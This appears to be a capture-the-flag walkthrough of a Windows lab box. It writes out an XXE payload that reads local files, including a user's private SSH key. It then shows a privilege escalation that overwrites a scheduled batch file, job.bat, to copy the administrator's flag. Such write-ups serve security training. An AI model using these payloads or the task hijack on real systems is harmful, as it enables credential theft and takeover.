this box has a site

in the html someone left a comment edited by daniel
thus we got a username

and one of the pages includes some xml procesesing

trying xxe:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>

this works, so we can read files
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>

we use this key to ssh to the box

we find some log things:
cd C:\Log-Management
and a file job.bat

and we can see our permissions:
icacls job.bat

we see we can write to it
and admins can run it
using powershell -c ps

we see it is run from time to time

with this we can get the user flag to test by runnin it ourself
echo C:\xampp\php\php.exe -r "system('type C:\Users\Daniel\Desktop\user.txt>test');">job.bat
type test

and this is how to get the flag
echo C:\xampp\php\php.exe -r "system('type C:\Users\Administrator\Desktop\root.txt>C:\Log-Management\test');">C:\Log-Management\job.bat
type C:\Log-Management\test
